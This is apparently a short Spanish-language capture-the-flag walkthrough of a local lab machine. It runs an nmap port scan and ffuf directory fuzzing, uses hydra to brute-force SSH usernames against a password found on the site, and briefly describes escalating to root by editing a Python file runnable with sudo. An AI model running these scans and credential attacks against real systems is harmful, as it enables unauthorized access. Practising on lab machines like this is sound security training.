Fecha: 07/09/2024

Empiezo usando nmap: 
```bash
sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -Pn 172.17.0.3 -oN scan
```

Hago fuzzing para encontrar páginas. 

```bash
ffuf -c -w /usr/share/wordlists/directory-list-2.3-medium.txt -u http://172.17.0.3/FUZZ  -e .php,.html,.txt,.js,.py -o fuzzing
```

![](imágenes/Pasted%20image%2020240907214647.png)

En index.php encuentro un texto (JIFGHDS87GYDFIGD), que tiene pinta de contraseña:
![](imágenes/Pasted%20image%2020240907214844.png)

Uso hydra para buscar el propietario de esa contraseña:
```bash
hydra -p JIFGHDS87GYDFIGD  -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt ssh://172.17.0.3 -t 64
```

Lo primero que hago es mirar qué permisos tengo: 
![](imágenes/Pasted%20image%2020240907214602.png)

Puedo ejecutar un archivo con python como su, así que miro los permisos, los cambio, lo edito, y me convierto en root:
![](imágenes/Pasted%20image%2020240907214528.png)